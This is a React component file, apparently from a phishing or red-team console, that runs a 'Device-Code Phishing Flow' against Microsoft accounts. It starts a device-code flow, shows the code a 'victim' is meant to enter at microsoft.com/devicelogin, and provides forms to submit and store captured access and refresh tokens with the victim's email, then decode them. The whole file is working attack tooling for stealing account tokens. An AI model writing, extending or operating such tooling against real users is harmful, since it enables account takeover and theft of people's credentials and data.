import { useState, useEffect } from 'react'
import Modal from './Modal'
import { useToast } from './Toast'
import { oauthApi } from '../lib/api'
import { Play, Copy, CheckCircle, Terminal } from 'lucide-react'
import JWTDecoder from './JWTDecoder'

export default function OAuthFlowModal({ open, onClose, sessionEmail }) {
  const toast = useToast()
  const [phase, setPhase] = useState('idle')
  const [flow, setFlow] = useState(null)
  const [captured, setCaptured] = useState(null)
  const [submitForm, setSubmitForm] = useState({ access_token: '', refresh_token: '', account: '', expires_in: 3600 })
  const [decoderOpen, setDecoderOpen] = useState(false)

  useEffect(() => {
    if (!open) {
      setPhase('idle'); setFlow(null); setCaptured(null)
      setSubmitForm({ access_token: '', refresh_token: '', account: '', expires_in: 3600 })
    }
  }, [open])

  const start = async () => {
    try {
      const data = await oauthApi.start({ session_email: sessionEmail || '[email protected]' })
      setFlow(data); setPhase('waiting')
      toast.info(`Code: ${data.user_code}`)
    } catch (e) { toast.error('Failed to start device flow'); }
  }

  const submit = async () => {
    if (!flow || !submitForm.access_token) return toast.error('Access token required')
    try {
      const r = await oauthApi.submit({ device_code: flow.device_code, ...submitForm })
      setCaptured(r.token_name); setPhase('captured')
      toast.success(`Captured & saved as ${r.token_name}`)
    } catch (e) { toast.error('Submit failed'); }
  }

  return (
    <>
      <Modal open={open} onClose={onClose} title="Device-Code Phishing Flow" size="lg"
        footer={<>
          <button onClick={onClose} className="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-sm text-gray-300">Close</button>
          {phase === 'idle' && (
            <button onClick={start} className="px-4 py-2 rounded-lg bg-danger hover:brightness-110 text-sm text-white shadow-glow-danger flex items-center gap-2">
              <Play size={14} />Start Phish
            </button>
          )}
        </>}>
        {phase === 'idle' && (
          <div>
            <p className="text-gray-300 mb-3">Launch a Microsoft device-code flow for <span className="text-white font-medium">{sessionEmail}</span>.</p>
            <p className="text-sm text-gray-400">A new device_code will be generated server-side along with a user_code the victim will enter at microsoft.com/devicelogin.</p>
          </div>
        )}
        {phase === 'waiting' && flow && (
          <div className="space-y-4">
            <div className="p-5 rounded-xl bg-gradient-to-br from-accent/15 to-purple/10 border border-accent/30 text-center">
              <div className="text-xs text-gray-400 uppercase mb-2">Victim enters this code at</div>
              <div className="text-sm text-accent font-mono mb-3 break-all">{flow.verification_url}</div>
              <div className="text-5xl font-mono font-bold tracking-widest text-white">{flow.user_code}</div>
              <button onClick={async () => { await navigator.clipboard.writeText(flow.user_code); toast.success('Code copied') }}
                className="mt-3 text-xs text-accent hover:underline"><Copy size={12} className="inline mr-1" />Copy code</button>
            </div>
            <div className="text-xs text-gray-400 grid grid-cols-2 gap-2">
              <div>Client ID: <span className="text-white font-mono text-[10px]">{flow.client_id}</span></div>
              <div>Scope: <span className="text-white font-mono text-[10px]">{flow.scope}</span></div>
              <div>Expires in: <span className="text-white">{Math.round(flow.expires_in / 60)} min</span></div>
              <div>Interval: <span className="text-white">{flow.interval}s</span></div>
            </div>
            <div className="border-t border-white/10 pt-4">
              <div className="text-xs text-gray-400 mb-2 flex items-center gap-2"><Terminal size={12} />Manual token submission (for testing / captured-via-other-channel)</div>
              <div className="grid grid-cols-1 gap-2">
                <input value={submitForm.access_token} onChange={(e) => setSubmitForm({ ...submitForm, access_token: e.target.value })} placeholder="eyJ... captured access_token" />
                <input value={submitForm.refresh_token} onChange={(e) => setSubmitForm({ ...submitForm, refresh_token: e.target.value })} placeholder="refresh_token (optional)" />
                <input value={submitForm.account} onChange={(e) => setSubmitForm({ ...submitForm, account: e.target.value })} placeholder="victim@email.com" />
              </div>
              <button onClick={submit} className="mt-3 w-full py-2 rounded-lg bg-success hover:brightness-110 text-sm text-white shadow-glow-success">Submit captured token</button>
            </div>
          </div>
        )}
        {phase === 'captured' && (
          <div className="text-center py-4">
            <CheckCircle size={48} className="text-success mx-auto mb-3" />
            <h3 className="text-lg font-semibold text-white mb-1">Token Captured</h3>
            <p className="text-sm text-gray-400 mb-4">Stored as <code className="text-accent">{captured}</code></p>
            <div className="flex justify-center gap-2">
              <button onClick={() => setDecoderOpen(true)} className="px-4 py-2 rounded-lg bg-accent hover:brightness-110 text-sm text-white shadow-glow">Decode JWT</button>
            </div>
          </div>
        )}
      </Modal>
      {captured && (
        <JWTDecoder open={decoderOpen} onClose={() => setDecoderOpen(false)} tokenName={captured} />
      )}
    </>
  )
}
